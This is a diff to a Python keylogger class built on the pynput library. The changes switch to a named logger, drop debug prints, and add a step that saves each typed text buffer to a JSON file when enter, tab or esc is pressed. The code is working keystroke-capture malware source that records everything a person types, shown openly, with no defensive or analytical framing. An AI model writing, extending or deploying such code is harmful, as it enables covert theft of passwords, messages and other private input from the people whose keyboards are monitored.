@@ -5,12 +5,13 @@ from pynput.keyboard import Listener
 # import pynput
 # if o pc for windows:
 # from pynput.keyboard._win32 import KeyCode
-from pynput import keyboard
 from Loggers.Logger import Logger
+from Functions.JSONLib import JSONLib
 
-logger = Logger()
+logger = Logger("Keyboard")
+json = JSONLib()
 
-class KeyLogger(Logger):
+class KeyLogger():
 
     def __init__(self):
         self.keys = []
@@ -42,7 +43,7 @@ class KeyLogger(Logger):
         functions_keys = ["Key.enter", "Key.tab", "Key.esc"]
 
         if not str(key) in functions_keys:
-            print(str(key) == "Key.space")
+            # print(str(key) == "Key.space")
             if str(key) == "Key.space":
                 self.__add_in_text(" ")
             if str(key) == "Key.backspace":
@@ -52,13 +53,15 @@ class KeyLogger(Logger):
         if str(key) in functions_keys:
             self.set_keys(self.get_text(), text=True)
             self.set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
+            
+            json.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
             self.text = "" 
         if str(key) == "Key.cmd":
             self.set_keys("SUPER", key_press=key, text=False)
 
     def set_keys(self, key: str, **kwargs) -> None:
         self.keys.append(key)
-        logger.log_info(message=f"'{key}'", **kwargs)
+        logger.info(message=f"'{key}'", **kwargs)
     
     def get_keys(self) -> list:
         return self.keys
@@ -69,17 +72,15 @@ class KeyLogger(Logger):
     def get_text(self) -> str:
         return self.text
 
-    def on_press(self, key) -> str:
-        logger.log_debug(message=f"{key} pressed")
-        logger.log_info(message=f"{key}", key_press=key, text=False)
+    def on_press(self, key) -> None:
+        logger.debug(message=f"{key} pressed")
+        logger.info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
-        print(self.get_keys())
         
-    def on_release(self, key) -> str:
-        logger.log_debug(message=f"{key} released")
+    def on_release(self, key) -> None:
+        logger.debug(message=f"{key} released")
         
     def keyboard_listener(self) -> None:    
-        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
-        listener.stop()
             
